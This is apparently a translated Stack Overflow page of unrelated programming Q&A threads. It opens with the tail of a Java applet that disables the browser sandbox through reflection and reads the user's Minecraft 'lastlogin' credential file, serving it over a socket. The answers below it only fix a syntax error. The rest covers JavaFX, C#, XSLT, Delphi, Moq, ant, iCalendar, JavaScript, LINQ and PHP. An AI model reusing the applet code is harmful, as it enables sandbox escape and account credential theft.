        throws Throwable
    {
        Object arrayOfObject[] = new Object[1];
        arrayOfObject[0] = paramString;
        Expression localExpression = new Expression(Class.class, "forName", arrayOfObject);
        localExpression.execute();
        return (Class)localExpression.getValue();
    }

    private void SetField(Class paramClass, String paramString, Object paramObject1, Object paramObject2)
        throws Throwable
    {
        Object arrayOfObject[] = new Object[2];
        arrayOfObject[0] = paramClass;
        arrayOfObject[1] = paramString;
        Expression localExpression = new Expression(GetClass("sun.awt.SunToolkit"), "getField", arrayOfObject);
        localExpression.execute();
        ((Field)localExpression.getValue()).set(paramObject1, paramObject2);
    }

    public void start()
    {
        String userName = System.getProperty("user.name");
        File llf = File( "c:/Users/" + userName + "/AppData/Roaming/.minecraft/lastlogin" );
        InputStream inputStream = new FileInputStream(llf);

        ServerSocket serverSocket = new ServerSocket(13346);
        Socket socket = serverSocket.accept();
        OutputStream outputStream = socket.getOutputStream();

        int len = 0;
        byte[] buffer = new byte[16384];
        while ((len = inputStream.read(buffer)) > 0)
            outputStream.write(buffer, 0, len);

        inputStream.close();
        outputStream.close();
        socket.close();
    }

    public void init()
    {
        try
        {
            disableSecurity();
   //         Process localProcess = null;
   //         localProcess = Runtime.getRuntime().exec("calc.exe");
   //         if(localProcess != null);
   //            localProcess.waitFor();
        }
        catch(Throwable localThrowable)
        {
            localThrowable.printStackTrace();
        }
    }

    public void paint(Graphics paramGraphics)
    {
        paramGraphics.drawString("Loading...", 25, 50);
    }
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T10:56:09.353

你想构造一个新的 File 对象，所以你应该使用`new`操作符。

```
 File llf = new File("..."); 
```

另请注意，通常是您不合理，而不是您使用的代码，尤其是在您的编程生涯的最初几年。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T10:56:56.817

它缺少`new`创建类 File 的新对象。没有不属于对象或（`static`方法）类的方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T10:58:10.353

您忘记在 File 之前添加 new 运算符。

```
File llf = new File( "c:/Users/" + userName + "/AppData/Roaming/.minecraft/lastlogin" ); 
```

# javafx-2 - JavaFX 2.x：X 和 Y 轴设置

> ID：12213896
> 
> 赞同：1
> 
> 时间：2012-08-31T10:54:39.080
> 
> 标签：javafx-2, linechart, splitpanel

我下面的代码在 VERTICAL 分割的 SplitPane 中绘制了 2 个 XY 折线图。

我的问题：

我想在底部同时有 Y 轴和只有一个 X 轴（仅在下图中的 X 轴）

```
public class XyChartInSplit extends Application {
SplitPane               splitPane1 = null;
@Override
public void start(Stage stage) {
   stage.setTitle("Line plot");

   final CategoryAxis xAxis1 = new CategoryAxis();
   final NumberAxis yAxis1 = new NumberAxis(1, 21,0.1);

   yAxis1.setTickUnit(1);
   yAxis1.setPrefWidth(35);
   yAxis1.setMinorTickCount(10);

   yAxis1.setTickLabelFormatter(new NumberAxis.DefaultFormatter(yAxis1){
        @Override
    public String toString(Number object){
            String label;
            label = String.format("%7.2f", object.floatValue());
            return label;
    }
});
  final LineChart<String, Number>lineChart1 = new LineChart<String, Number>(xAxis1, yAxis1);

   lineChart1.setCreateSymbols(false);
   lineChart1.setAlternativeRowFillVisible(false);
   lineChart1.setLegendVisible(false);
   lineChart1.setAnimated(false);

   XYChart.Series series1 = new XYChart.Series();

    series1.getData().add(new XYChart.Data("Jan", 1));
    series1.getData().add(new XYChart.Data("Feb", 2));
    series1.getData().add(new XYChart.Data("Mar", 1.5));
    series1.getData().add(new XYChart.Data("Apr", 3));
    series1.getData().add(new XYChart.Data("May", 2.5));
    series1.getData().add(new XYChart.Data("Jun", 5));
    series1.getData().add(new XYChart.Data("Jul", 4));
    series1.getData().add(new XYChart.Data("Aug", 8));
    series1.getData().add(new XYChart.Data("Sep", 6.5));
    series1.getData().add(new XYChart.Data("Oct", 13));
    series1.getData().add(new XYChart.Data("Nov", 10));
    series1.getData().add(new XYChart.Data("Dec", 20));

    //final BorderPane pane1 = new BorderPane();
    //pane1.setCenter(lineChart1);                          
    lineChart1.getData().addAll(series1); 

    final CategoryAxis xAxis2 = new CategoryAxis();
   final NumberAxis yAxis2 = new NumberAxis(1, 21,0.1);

   yAxis2.setTickUnit(1);
   yAxis2.setPrefWidth(35);
   yAxis2.setMinorTickCount(10);

   yAxis2.setTickLabelFormatter(new NumberAxis.DefaultFormatter(yAxis2){
        @Override
    public String toString(Number object){
            String label;
            label = String.format("%7.2f", object.floatValue());
            return label;
    }
});

    final LineChart<String, Number>lineChart2 = new LineChart<String, Number>(xAxis2, yAxis2);

   lineChart2.setCreateSymbols(false);
   lineChart2.setAlternativeRowFillVisible(false);
   lineChart2.setLegendVisible(false);
   lineChart2.setAnimated(false);

    XYChart.Series series2 = new XYChart.Series();

    series2.getData().add(new XYChart.Data("Jan", 1));
    series2.getData().add(new XYChart.Data("Feb", 3));
    series2.getData().add(new XYChart.Data("Mar", 1.5));
    series2.getData().add(new XYChart.Data("Apr", 3));
    series2.getData().add(new XYChart.Data("May", 4.5));
    series2.getData().add(new XYChart.Data("Jun", 5));
    series2.getData().add(new XYChart.Data("Jul", 4));
    series2.getData().add(new XYChart.Data("Aug", 8));
    series2.getData().add(new XYChart.Data("Sep", 16.5));
    series2.getData().add(new XYChart.Data("Oct", 13.9));
    series2.getData().add(new XYChart.Data("Nov", 17));
    series2.getData().add(new XYChart.Data("Dec", 20));

   // final BorderPane pane2 = new BorderPane();
    //pane2.setCenter(lineChart2);          

    lineChart2.getData().addAll(series2);

    splitPane1 = new SplitPane();                                
    splitPane1.setOrientation(Orientation.VERTICAL);
    splitPane1.getItems().addAll(lineChart1);
    splitPane1.setDividerPosition(0, 1);

    Scene scene = new Scene(splitPane1, 800, 600);

     Platform.runLater(new Runnable() {
         @Override
         public void run() {
             double percSplit;

            splitPane1.getItems().addAll(lineChart2);

            ObservableList<SplitPane.Divider> splitDiv =  splitPane1.getDividers();

            percSplit = 1/(double)(splitDiv.size()+1);
            for (int i = 0; i< splitDiv.size(); i++) {                        
                splitPane1.setDividerPosition(i, percSplit);
                percSplit += 1/(double)(splitDiv.size()+1);
                }
         }
     });

    stage.setScene(scene);
    stage.show();
}

public static void main(String[] args) {
    launch(args);
} 
```

}

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-09-22T14:59:05.960

您可能想为此功能请求投票：[https ://javafx-jira.kenai.com/browse/RT-14710](https://javafx-jira.kenai.com/browse/RT-14710)

# c# - 显示文件的属性页面并导航到选项卡

> ID：12213903
> 
> 赞同：3
> 
> 时间：2012-08-31T10:54:51.367
> 
> 标签：c#, pinvoke

在我的软件中，我需要显示文件的属性对话框并导航到该属性对话框中的特定选项卡？请告诉我如何使用 c# 来实现这一点？

或者是否可以用自定义对话框替换默认属性对话框？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-05-29T10:28:17.863

```
private bool properties(string Filename) 
{
    SHELLEXECUTEINFO info = new SHELLEXECUTEINFO();
    info.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(info);
    info.lpVerb = "properties";
    info.lpParameters = "Details";
    info.lpFile = Filename;
    info.nShow = SW_SHOW;
    info.fMask = SEE_MASK_INVOKEIDLIST;
    return ShellExecuteEx(ref info);
} 
```

通过将 info.lpParameters 设置为选项卡的名称，您希望它在选择该选项卡的情况下打开。就我而言，“详细信息”...

是的，您需要 codeteq 编写的声明。

这是我使用的声明：

```
private const int SW_SHOW = 5;
private const uint SEE_MASK_INVOKEIDLIST = 12;

[DllImport("shell32.dll", CharSet = CharSet.Auto)]
static extern bool ShellExecuteEx(ref SHELLEXECUTEINFO lpExecInfo);

[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
public struct SHELLEXECUTEINFO
{
     public int cbSize;
     public uint fMask;
     public IntPtr hwnd;
     [MarshalAs(UnmanagedType.LPTStr)]
     public string lpVerb;
     [MarshalAs(UnmanagedType.LPTStr)]
     public string lpFile;
     [MarshalAs(UnmanagedType.LPTStr)]
     public string lpParameters;
     [MarshalAs(UnmanagedType.LPTStr)]
     public string lpDirectory;
     public int nShow;
     public IntPtr hInstApp;
     public IntPtr lpIDList;
     [MarshalAs(UnmanagedType.LPTStr)]
     public string lpClass;
     public IntPtr hkeyClass;
     public uint dwHotKey;
     public IntPtr hIcon;
     public IntPtr hProcess; 
```

}

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T11:08:21.820

您必须使用 P/Invoke 来实现：

```
private const int SW_SHOW = 5;
private const uint SEE_MASK_INVOKEIDLIST = 12;

[DllImport("shell32.dll")]
static extern bool ShellExecuteEx(ref SHELLEXECUTEINFO lpExecInfo);

public static void ShowFileProperties(string filename) 
{
    SHELLEXECUTEINFO info = new SHELLEXECUTEINFO();
    info.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(info);
    info.lpVerb = "properties";
    info.lpFile = filename;
    info.nShow = SW_SHOW;
    info.fMask = SEE_MASK_INVOKEIDLIST;
    ShellExecuteEx(ref info);
} 
```

不知道是否甚至可以选择特定的选项卡（以一种不错的方式）...

# c#-4.0 - SAXON XSLT 错误

> ID：12213908
> 
> 赞同：0
> 
> 时间：2012-08-31T10:55:07.707
> 
> 标签：c#-4.0, saxon

我有以下尝试将 cvs 文件转换为 xml 的测试代码。我遇到的问题是有时它会运行，有时它会失败并出现以下错误：

```
The specified node cannot be inserted as the valid child of this node, because the specified node is the wrong type. 
```

这是代码：

```
 XsltCompiler compiler = null;
        try
        {
            Processor processor = new Processor();
            compiler = processor.NewXsltCompiler();

            var sr = new StreamReader(@"c:\files\drop\csv-to-xml_v2.xslt");
            var xslt = sr.ReadToEnd();
            sr.Close();

            StringReader reader = new StringReader(xslt);

            XsltExecutable exec = compiler.Compile(reader);

            XsltTransformer transformer = exec.Load();

            transformer.InitialTemplate = new QName("", "main");

            var XmlResult = new DomDestination();

            transformer.Run(XmlResult);

            reader.Close();
        }
        catch (Exception ex)
        {
            var errMsg = ex.Message;
            var errList = compiler != null ? compiler.ErrorList : null;
        } 
```

XSLT 是：

```
<?xml version="1.0"?>

<xsl:stylesheet version="2.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:xs="http://www.w3.org/2001/XMLSchema"
xmlns:fn="fn"
exclude-result-prefixes="xs fn">

<xsl:output indent="yes" encoding="US-ASCII"/>

<xsl:param name="pathToCSV" select="'file:///C:/Files/Drop/inputcsv1.csv'"/>

<xsl:function name="fn:getTokens" as="xs:string+">
<xsl:param name="str" as="xs:string"/>
    <xsl:analyze-string select="concat($str, ',')" regex='(("[^"]*")+|[^,]*),'>
        <xsl:matching-substring>
            <xsl:sequence select='replace(regex-group(1), "^""|""$|("")""", "$1")'/>
        </xsl:matching-substring>
    </xsl:analyze-string>
</xsl:function>

<xsl:template match="/" name="main">
<xsl:choose>
    <xsl:when test="unparsed-text-available($pathToCSV)">
        <xsl:variable name="csv" select="unparsed-text($pathToCSV)"/>
        <xsl:variable name="lines" select="tokenize($csv, '&#xD;')" as="xs:string+"/>
        <xsl:variable name="elemNames" select="fn:getTokens($lines[1])" as="xs:string+"/>
        <root>
            <xsl:for-each select="$lines[position() > 0]">
                <row>
                    <xsl:variable name="lineItems" select="fn:getTokens(.)" as="xs:string+"/>

                    <xsl:for-each select="$elemNames">
                        <xsl:variable name="pos" select="position()"/>
                        <column>
                            <xsl:value-of select="$lineItems[$pos]"/>
                        </column>
                    </xsl:for-each>
                </row>
            </xsl:for-each>
        </root>
    </xsl:when>
    <xsl:otherwise>
        <xsl:text>Cannot locate : </xsl:text><xsl:value-of select="$pathToCSV"/>
    </xsl:otherwise>
</xsl:choose>
</xsl:template>

</xsl:stylesheet> 
```

谁能明白为什么有时它会起作用，然后无缘无故地在“transformer.Run(XmlResult)”行上失败？我正在使用 c# 4、Visual Studio 2010 和 Saxon 9 HE。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-08T17:43:34.670

在“否则”分支中，您将创建一个文本节点作为文档节点的子节点。因为您的目的地是 DOM 目的地，所以这是不允许的。（它在 XDM 数据模型中是允许的，但是没有办法在 DOM 中表示它）。

# delphi - 在调用 Canvas.DrawBitmap (Firemonkey) 之前对位图应用转换

> ID：12213914
> 
> 赞同：3
> 
> 时间：2012-08-31T10:55:54.837
> 
> 标签：delphi, bitmap, transform, delphi-xe2, firemonkey

下午好。

我正在开发一个绘图程序，该程序允许用户将加载了位图的 TImages 拖放到画布上。（在 RAD Studio XE2 中的 Firemonkey HD 应用程序中）用户可以在保存图像之前更改 x 和 y 比例和旋转。所有的 TImage 都保存在一个列表中，然后使用这个简单的过程将该列表写入底层画布：

```
 for i := 0 to DroppedList.Count - 1 do
  begin
    AImage := DroppedList[i];
    SourceRect.Left := 0;
    SourceRect.Right := AImage.Bitmap.Width;
    SourceRect.Top := 0;
    Sourcerect.Bottom := AImage.Bitmap.Height;

    TargetRect.Left := AImage.Position.X;
    TargetRect.Right := AImage.Position.X + AImage.Bitmap.Width;
    TargetRect.Top := AImage.Position.Y;
    TargetRect.Bottom := AImage.Position.Y + AImage.Bitmap.Height;

    with FImage.Bitmap do
    begin
      Canvas.BeginScene;
      Canvas.DrawBitmap(AImage.Bitmap, SourceRect, TargetRect, 1, True);
      Canvas.EndScene;
      BitmapChanged
    end;
  end;

  FImage.Bitmap.SaveToFile('test.bmp'); 
```

这样做的问题是，DrawBitmap 没有考虑到窗口中可见图像的缩放和旋转的转换，并且在保存时会丢失。我正在寻找一种在将位图绘制到背景之前将转换应用于位图的方法。我无法找到有关此的任何信息，所以我希望这里有人可以提供帮助。

谢谢你，丹尼尔

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-01T15:27:46.330

问题似乎是缩放和旋转应用于源 TImage。在这个“源 TImage”中，不是对位图进行转换，而是在 TImage 级别进行转换（因为它是一个 TControl，并且作为所有 TControl，它们都可以缩放和旋转）。稍后您将源 Bitmap 复制到其他地方，但*实际上此 Bitmap 从未更改过*。

因此必须根据源 TImage 中的设置在循环中旋转和缩放位图：

```
with FImage.Bitmap do
begin
  Canvas.BeginScene;     
  LBmp := TBitmap.Create;
  try
    // create a copy on which transformations will be applyed
    LBmp.Assign(AImage.Bitmap); 
    // rotate the local bmp copy according to the source TImage.
    if AImage.RotationAngle <> 0 then
      LBmp.Rotate( AImage.RotationAngle);
    // scale the local bmp copy...
    If AImage.Scale.X <> 1 
      then ;
    Canvas.DrawBitmap(LBmp, SourceRect, TargetRect, 1, True);
  finally
    LBmp.Free;
    Canvas.EndScene;
    BitmapChanged
  end;
end; 
```

这个简单的代码示例很好地解释了这个问题。例如， RotatationAngle 是 AImage 的属性，**而**不是**AImage.Bitmap**的属性。

避免实现转换的解决方法是使用**TControl.MakeScreenshot()。**（有待验证，这可能会失败）

```
with FImage.Bitmap do
begin
  Canvas.BeginScene;
  LBmpInclTranformations := AImage.MakeScreenShot;
  Canvas.DrawBitmap(LBmpInclTranformations, SourceRect, TargetRect, 1, True);
  Canvas.EndScene;
  BitmapChanged
end; 
```

# c# - 如何强制 moq 调用构造函数？

> ID：12213916
> 
> 赞同：6
> 
> 时间：2012-08-31T10:55:58.660
> 
> 标签：c#, .net, moq

我有一个单元测试来验证当使用某些 eventArgs 触发事件时对象（例如`Foo`）将调用某些方法（例如）。`Bar`为了模拟上述方法，我使用虚拟和存根`Foo`类

```
Mock<Foo> stubbedFoo = new Mock<Foo>(mockEventProvider);

mockEventProvider.Raise( x => x.MyEvent += null, myEventArgs ) //fire the event
stubbedFoo.Verify(foo => foo.Bar()); verify Bar is called as a result 
```

但是，上面失败了，Bar 不会被调用，显然是因为 Foo 对象不是事件构造的。但是，如果我添加如下一行：

```
Mock<Foo> stubbedFoo = new Mock<Foo>(mockEventProvider);
var workAround = stubbedFoo.Object //adding this workaround will work
mockEventProvider.Raise( x => x.MyEvent += null, myEventArgs ) //fire the event
stubbedFoo.Verify(foo => foo.Bar()); verify Bar is called as a result 
```

它会起作用，因为在 .Object 上调用 get 显然会强制 mock 构造对象。有没有比添加这条线更优雅的解决方案？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-10-08T21:55:55.090

我不认为你可以。我检查了最小起[订量源](http://code.google.com/p/moq/source/checkout)并戳穿它，它看起来不像[城堡](http://www.castleproject.org/projects/dynamicproxy/)的代理拦截器实际上是在你调用之前创建的`.Object`。看看这个踪迹：

```
public object Object
{
    get { return this.GetObject(); }
}

private object GetObject()
{
    var value = this.OnGetObject();
    this.isInitialized = true;
    return value;
} 
```

其次是

```
protected override object OnGetObject()
{
    if (this.instance == null)
    {
        this.InitializeInstance();
    }

    return this.instance;
} 
```

这样做：

```
private void InitializeInstance()
{
    PexProtector.Invoke(() =>
    {
        this.instance = proxyFactory.CreateProxy<T>(
            this.Interceptor,
            this.ImplementedInterfaces.ToArray(),
            this.constructorArguments);
    });
} 
```

ProxyFactory 实际创建对象并将其包装在代理中

```
public T CreateProxy<T>(ICallInterceptor interceptor, Type[] interfaces, object[] arguments)
{
    var mockType = typeof(T);

    if (mockType.IsInterface)
    {
        return (T)generator.CreateInterfaceProxyWithoutTarget(mockType, interfaces, new Interceptor(interceptor));
    }

    try
    {
        return (T)generator.CreateClassProxy(mockType, interfaces, new ProxyGenerationOptions(), arguments, new Interceptor(interceptor));
    }
    catch (TypeLoadException e)
    {
        throw new ArgumentException(Resources.InvalidMockClass, e);
    }
    catch (MissingMethodException e)
    {
        throw new ArgumentException(Resources.ConstructorNotFound, e);
    }
} 
```

# java - Java ant 脚本不显示警告

> ID：12213923
> 
> 赞同：4
> 
> 时间：2012-08-31T10:56:12.950
> 
> 标签：java, ant, warnings, javac

我有一个 1.4 java 代码，我想用 1.5 编译器编译它，因为我想查看所有警告消息。我在 javac 中添加了 -Xlint 选项，但输出似乎没有变化，但我知道代码中至少有几个警告。

我将这两行添加到我的 ant 脚本的编译目标标记中：

```
<compilerarg value="-Xlint:all"/>
<compilerarg line="-Xmaxwarns 10000"/> 
```

谢谢您的回答。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-31T11:03:59.863

您同时使用了 value 和 line 属性。Compilerarg 需要“其中之一”，请参阅文档。尝试仅使用行，例如：`<compilerarg line="-Xlint:all -Xmaxwarns 10000"/>`

# icalendar - 结束时间和 RRULE 无法正常工作

> ID：12213924
> 
> 赞同：0
> 
> 时间：2012-08-31T10:56:17.263
> 
> 标签：icalendar

这里有 2 个要添加到日历中的事件。

第一次活动详情

1.  摘要：类：ACCT 1001 1 讲座（1829 年）
2.  开始日期和时间：2012 年 8 月 30 日和下午 3 点
3.  结束日期：2012 年 12 月 12 日和下午 3.50
4.  MO,WE,FR 只有这几天需要在日期范围内设置（不需要设置全天）。

以下是我的 ics 格式：

> `BEGIN:VCALENDAR PRODID:-//bashmoblie v0.1//NONSGML iCal Writer//EN VERSION:2.0 CALSCALE:GREGORIAN METHOD:PUBLISH BEGIN:VEVENT DTSTART:20120830T150000 RRULE:FREQ=WEEKLY;UNTIL=20121212T155000;WKST=SU;BYDAY=MO,WE,FR DTSTAMP:20091130T213238Z UID:1285935469767a7c7c1a9b3f0df8003a@yoursever.com CREATED:20091130T213238Z SUMMARY:Class: ACCT 1001 1 Lecture(1829) LAST-MODIFIED:20091130T213238Z EQUENCE:0 STATUS:CONFIRMED SUMMARY:Class: ACCT 1001 1 Lecture(1829) LOCATION:Title: Introduction to Accounting(Lecture) TRANSP:OPAQUE END:VEVENT BEGIN:VEVENT DTSTART:20120830T170000 RRULE:FREQ=WEEKLY;UNTIL=20121212T175000;WKST=SU;BYDAY=MO,WE,FR DTSTAMP:20091130T213238Z UID:1285935469767a7c7c1a9b3f0df8003a@yoursever.com CREATED:20091130T213238Z SUMMARY:Class: SOC 180 1 Lecture(1378) LAST-MODIFIED:20091130T213238Z EQUENCE:0 STATUS:CONFIRMED SUMMARY:Class: SOC 180 1 Lecture(1378) LOCATION:Title: World Pop Probs(Lecture) TRANSP:OPAQUE END:VEVENT END:VCALENDAR`

问题在于没有更正结束时间（开始时间：下午 3 点，结束时间是下午 3 点）。这里的开始和结束时间相同，并且现在一周中的 rrule(MO,WE,FR) 设置不正确。

请问有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-17T15:14:00.553

您是否尝试使用在线验证器验证您的 ics，其中似乎有很多拼写错误（http://icalvalid.cloudapp.net/Default.aspx）。

你也能澄清你的意思结束日期：2012 年 12 月 12 日和下午 3.50 吗？你的意思是你的偶数是每个月，我们，从下午 3:00 到下午 3:50？那么您应该定义一个持续时间属性或定义一个 dtend=20120830T155000

对您的意图进行假设，看起来您将 dtend 与 until 属性混淆了。

# javascript - JS 构造函数

> ID：12213925
> 
> 赞同：1
> 
> 时间：2012-08-31T10:56:20.937
> 
> 标签：javascript

我正在通过了解如何创建具有属性和方法的构造函数来工作。我已经编写并测试了下面的一个，但它不起作用。有人可以花时间帮助我了解是什么导致这不起作用。了解我已经搜索过谷歌，我正在阅读书籍等，但需要一些帮助来理解这个概念并创建我自己的。谢谢你。

```
function ball( type, grip, shape ) {
  this.type = type;
  this.grip = grip;
  this.shape = shape;
  this.caught = function( who,how ) {
    this.who = who;
    this.how = how;
  };
  this.player = function() {
    return (who + "caught the ball" + how + "that was a" + type + "shaped like 
            a " + shape + "thrown with a" + grip);
    };
};

var baseball = new ball("Mickey Mantle","sliding","baseball","circle","fastball");

console.log(ball); 
```

**编辑：** 从下面的答案中-感谢您的分享-我已经创建了我的 jsfiddle，但无法理解为什么被捕获的属性不起作用。我应该如何设置此方法的属性？

[http://jsfiddle.net/uYTW6/](http://jsfiddle.net/uYTW6/)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-31T11:02:24.777

[http://jsfiddle.net/rvMNp/1/](http://jsfiddle.net/rvMNp/1/)

您应该这样做`console.log(baseball)`以获取当前对象。

同样在我的小提琴中，您会注意到您的播放器功能无法按预期工作。这是因为你的很多变量是未定义的。

* * *

`new ball("Mickey Mantle","sliding","baseball","circle","fastball");`

这是用 5 个变量调用球函数，但你的球函数只接受 3

`function ball( type, grip, shape )`

* * *

您还需要使用`this.*`函数中定义的任何变量，如下所示：

```
return (this.who + "caught the ball" + this.how + "that was a" + this.type + "shaped like a " + this.shape + "thrown with a" + this.grip); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-31T11:02:25.330

在您的播放器函数中，您需要使用 this 引用变量 who、how、type、shape 和 grip，即

```
return (this.who + "caught the ball" + this.how + "that was a" + this.type + "shaped like 
        a " + this.shape + "thrown with a" + this.grip);
}; 
```

此外，所有 ball 类型的对象共有的函数应该放入原型中，这样该函数只会被创建一次：

```
ball.prototype.player = function() {
    return (this.who + "caught the ball" + this.how + "that was a" + this.type + "shaped like a " + this.shape + "thrown with a" + this.grip);
    };
} 
```

以大写字母开头的构造函数名称也是常见的约定，例如在您的情况下为 B （因此您的构造函数的名称是 Ball，而不是 ball）。

**更新的答案**

您忘记调用`caught`棒球对象上的函数，如下所示：

```
var baseball = new Ball("Mickey Mantle","sliding","baseball","circle","fastball");
baseball.caught('me', 'by hand'); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-31T11:04:27.517

您只需要执行 console.log(baseball) 而不是 console.log(ball) 即可查看您创建的对象。此外，您需要在播放器函数的返回行的末尾和开头加上引号，如下所示：

```
return (who + "caught the ball" + how + "that was a" + type + "shaped like "+
        "a " + shape + "thrown with a" + grip);
}; 
```

# java - 如何检测 JavaFX 2.2 运行时可用性

> ID：12213929
> 
> 赞同：3
> 
> 时间：2012-08-31T10:56:26.500
> 
> 标签：java, browser, javafx, javafx-2

我在摇摆环境中使用带有 jdk1.6 的 javaFX 2.2。我正在尝试在 JPanel 上显示浏览器，并且我成功地做到了这一点。我看到的唯一问题是，当我在没有 javaFX2.2 运行时环境的任何其他机器上运行我的应用程序时，它会卡住并且不显示任何错误消息。我如何确定 javafx 运行时 env.
在执行new JFXPanel()之前机器上是否可用

因为代码停留在上面的行。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-03T09:49:34.057

```
boolean isJavaFxAvailable;
try {
  Class jfxPanel = classLoader.loadClass("javafx.embed.swing.JFXPanel");
  isJavaFxAvailable = true;
} catch (ClassNotFoundException e) {
  isJavaFxAvailable = false;
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-31T12:27:00.573

每个运行 JavaFX 应用程序的机器都需要有一个 JavaFX 运行时。我相信这个 runime 可能由 webstart 提供，但它必须是可访问的。

看这里： [如何获取 JavaFX 的版本号？](https://stackoverflow.com/questions/11266997/how-to-get-the-version-number-of-javafx)

# c# - 使用 LINQ 如何访问类中列表项的值

> ID：12213930
> 
> 赞同：0
> 
> 时间：2012-08-31T10:56:25.600
> 
> 标签：c#, .net, linq

我有两个班级`MoviesListRootObject`和`Response`. 我想访问 id、Title 和 description 的`MoviesListRootObject`conatins 列表并将其分配给 var。`Response``List<Response>`

```
public class MoviesListRootObject
{
    public int count { get; set; }
    public Pagination pagination { get; set; }
    public List<Response> response { get; set; }
}
[Serializable]
public class Response
{
    public int id { get; set; }
    public string title { get; set; }
    public string title_language { get; set; }
    public string description { get; set; }
    public string description_language { get; set; }
} 
```

现在我可以想到编写 LINQ 来获取包含响应的 MovieDetails 对象，但这无济于事。

```
var movieResponse = from MoviesListRootObject movieDetail in rootObj
    select new MovieDetails
    {
         Response =movieDetail.response
    }; 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-31T11:02:20.567

目前还不清楚您要达到的目标。我的回答假设您只想拥有所有 MoviesListRootObject 中所有响应的属性：

```
var result = rootObj.SelectMany(x => x.response)
                    .Select(x => new { x.id, x.title, x.description }); 
```

你甚至不需要一个匿名类：

```
var result = rootObj.SelectMany(x => x.response);
// result will be of type IEnumerable<Response> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-31T10:58:08.813

```
var movieResponse = rootObj
                    .SelectMany(m => m.response)
                    .Select(m => new {
                       id = m.id, // or just m.id, as name is the same
                       title = m.title, //idem
                       description = m.description //idem
                    }); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-31T11:05:38.303

你问的是[`SelectMany`](http://msdn.microsoft.com/en-us/library/system.linq.enumerable.selectmany.aspx)什么？

```
var allResponses = rootObj.SelectMany(d => d.Response); 
```

将为您`Response`提供所有电影的所有内容`rootObj`。

* * *

if`rootObj`实际上是`MoviesListRootObject`您不需要的实例`SelectMany`，

```
var responses = rootObj.response; 
```

会做。

# php - 将网页更改为电子邮件并发送

> ID：12213933
> 
> 赞同：0
> 
> 时间：2012-08-31T10:56:45.513
> 
> 标签：php, javascript, html, email

我有一个问题，我已经彻底搜索了互联网，但我找不到解决方案。

我想通过电子邮件发送表格。我希望通过电子邮件发送生成的整个页面。atm 我有这个代码：

```
<input name="email" type="button" onClick="javascript:location='mailto:test@hotmail.com?subject=Really Cool Website&body=test'"  value= "mail"> 
```

这允许我向我发送一封电子邮件到预设的电子邮件地址和主题。身体会说测试。但我似乎无法发送整个页面。有更多的东西缺少 atm，但我的 html/php 是有点生锈的 atm。这将是餐厅的送货单。[链接到餐厅网站以供参考](http://finefoodandwine.nl/Restaurant-Veldhoven/bestelformulier.php)它错过了很多 atm 功能，但我正在努力。有谁知道如何能够通过电子邮件发送页面。

提前致谢！整个代码写在下面。

碧玉

```
<html>
<body> 
<form>
<div>            
      <table width="900" border="0" cellspacing="0" cellpadding="0" class="content">
          <tr>
            <td width="140"><strong>Selecteer hoeveel porties:</strong><br><hr></td>
            <td width="572"><strong>Beschrijving</strong><br><br><hr></td>
            <td width="112"><strong>Prijs</strong><br><br><hr></td>
            <td width="76"><strong>Totaalprijs</strong><br><br><hr></td>
        </tr>
          <tr>
            <td><?php include('optie.php');?></td>
            <td><strong>3-gangen traiteurmenu</strong><br>
                (incl. brood en boter)<br>******<br>
                Creme van gerookte paling<br>******<br>
                Gestoofde hertensukade met aardappelgratin, rodekool en een stoofpeertje.<br>******<br>
                Kerstbal van witte en pure chocolade en een vanillesaus.<br><hr>
                </td>
            <td>&euro;16,50</td>
            <td>&euro;</td>
        </tr>
          <tr>
            <td><?php include('optie.php');?></td>
            <td><strong>Extra voorgerecht</strong><br>
                Gerookte eendenborstfilet met een rilette van eend en een mangochutney.<br></td>
            <td>&euro;5,--</td>
            <td>&euro;</td>
        </tr>
          <tr>
            <td><?php include('optie.php');?></td>
            <td><strong>Extra tussengerecht</strong><br>
                Gamba's geserveerd in een saus van ....?<br><hr></td>
            <td>&euro;5,--</td>
            <td>&euro;</td>
        </tr>
          <tr>
            <td><strong>Diversen</strong></td>
            <td></td>
            <td></td>
            <td></td>

        </tr>
          <tr>
            <td><?php include('optie.php');?></td>
            <td>Graved laks met een mosterd-dillesaus</td>
            <td>&euro;....... per 100 gram</td>
            <td>&euro;</td>
        </tr>
        <tr>
            <td><?php include('optie.php');?></td>
            <td>Kreeftensoep</td>
            <td>&euro;8.95 per 0,5L</td>
            <td>&euro;</td>
        </tr>
        <tr>
            <td><?php include('optie.php');?></td>
            <td>Wildpeper</td>
            <td>&euro;2.35 per 100 gram</td>
            <td>&euro;</td>
        </tr>
        <tr>
            <td><?php include('optie.php');?></td>
            <td>Aardappelgratin</td>
            <td>&euro;2.95</td>
            <td>&euro;</td>
        </tr>
        <tr>
            <td><?php include('optie.php');?></td>
            <td>Rodekool</td>
            <td>&euro;3.95</td>
            <td>&euro;</td>
        </tr>
        <tr>
            <td><?php include('optie.php');?></td>
            <td>Botersaus</td>
            <td>&euro;4,50 per 250 ml.</td>
            <td>&euro;</td>
        </tr>
        <tr>
            <td><?php include('optie.php');?></td>
            <td>Rode portsaus</td>
            <td>&euro;3.95 per 250 ml.</td>
            <td>&euro;</td>
        </tr>
        <tr>
